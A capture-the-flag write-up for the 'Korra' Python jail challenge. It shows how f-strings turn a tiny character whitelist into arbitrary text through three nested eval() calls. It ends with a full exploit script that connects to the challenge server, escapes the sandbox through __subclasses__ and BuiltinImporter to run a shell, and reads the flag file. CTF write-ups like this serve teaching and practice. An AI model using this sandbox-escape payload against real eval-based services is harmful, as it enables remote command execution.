Korra is an app that is exposed on a network socket. It has a restricted character set and three levels of `eval()` to get through. The previous year used a different character set and two levels of eval(). A nice write to get started with ideas is here (https://ctftime.org/writeup/38310)

```sh
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

print("The Avatar is deeper in the ice this time...")
code = input("input: ").strip()
whitelist = """abcdef"{>:}"""

if any([x not in whitelist for x in code]):
    print("Denied!")
    exit(0)

eval(eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})

print("The slumber continues...")
```

At the first `eval()` we have the characters `a b c d e f " { > : }`

With these characters, we can construct Python f-strings and get some additional characters

```python
>>> f"""{"a">"a":d}"""
'0'
>>> f"""{"b">"a":b}"""
'1'
>>> f"""{"b">"a":c}"""
'\x01'
>>> f"""{"a">"a":c}"""
'\x00'
```

Getting some of the same characters is straightforward (you can just quote enclose them), but getting a literal quote character after the first `eval()` level is tricky. The following does work though.

```python
>>> f"""{""}"{""}"""
'"'
```

Onto the second level. With `0` and `1` added, we can now represent any integer in binary format (ex. `0b01100101`). Combined with another Python f-string we can create any character. For example

```python
>>> f"{0b1010001:c}"
'Q'
>>> f"{0b1011100:c}"
'\\'
>>> f"{0b111111:c}"
'?'
```

With this, we can create any string at the second `eval()` level and get it evaluated by the third level.

Using a standard payload like the last writeup, we can get a shell on the server and get the flag. A full working script to do this below.

```python
#!/usr/bin/env python3

import socket
import time

BUFSIZE = 1024
DEBUG = False

def readuntil(s,val):
    buf = b''
    while not buf.endswith(val):
        ret = s.recv(BUFSIZE)
        buf = buf + ret
        if DEBUG and len(buf)%16 == 0:
            print(buf)
        if len(ret) == 0:
            break
    if DEBUG:
        print(buf)
    return buf

def sendall(s,buf):
    if DEBUG:
        print('>>', buf)
    n = s.send(buf)

def chal_exec(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect(('challs.glacierctf.com',13370))

    print(readuntil(s,b'input: '))
    sendall(s,payload.encode()+b'\n')
    time.sleep(1)
    sendall(s,b'cat /flag.txt\n')
    print(s.recv(1024).decode())

def encode1ch(ch):
    if ch == '"':
        return 'f"""{""}"{""}"""'
    if ch in """abcdef"{>:}""":
        return '"'+ch+'"'
    if ch == '0':
        return 'f"""{"a">"a":d}"""'
    if ch == '1':
        return 'f"""{"b">"a":d}"""'
    raise Exception('unknown encoding')

def encode1(st):
    res = ''
    for ch in st:
        res = res + encode1ch(ch)
    return res

def encode2ch(ch):
    return encode1('f"{0b'+f"{ord(ch):b}"+':c}"')

def encode2(st):
    res = ''
    for ch in st:
        res = res + encode2ch(ch)
    return res

if __name__ == '__main__':

    payload = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system('sh')"
    st = encode2(payload)
    print(st)

    chal_exec(st)
```
